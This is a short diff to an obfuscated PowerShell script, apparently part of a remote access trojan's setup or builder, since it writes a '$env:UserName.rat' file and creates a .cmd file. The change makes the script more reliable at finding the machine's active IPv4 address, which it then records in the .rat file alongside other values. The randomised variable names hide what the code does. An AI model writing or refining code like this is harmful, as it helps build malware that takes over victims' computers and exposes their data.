@@ -31,7 +31,14 @@ $NyZnoLKCIs = Get-Location
 $CRYnrkaDbe = "$env:UserName.rat"
 $oNumpPlFnH = Get-Content XbrMzmCUiE.txt
 $XpKqtwxTVC = Get-Content UJbMLjTIDr.txt
-$AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+# $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+$AhdjktGyiZ = (
+    Get-NetIPConfiguration |
+    Where-Object {
+        $_.IPv4DefaultGateway -ne $null -and
+        $_.NetAdapter.Status -ne "Disconnected"
+    }
+).IPv4Address.IPAddress
 Add-Content -Path "$NyZnoLKCIs/GiLqXiexKP.cmd" -Value "@echo off"
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
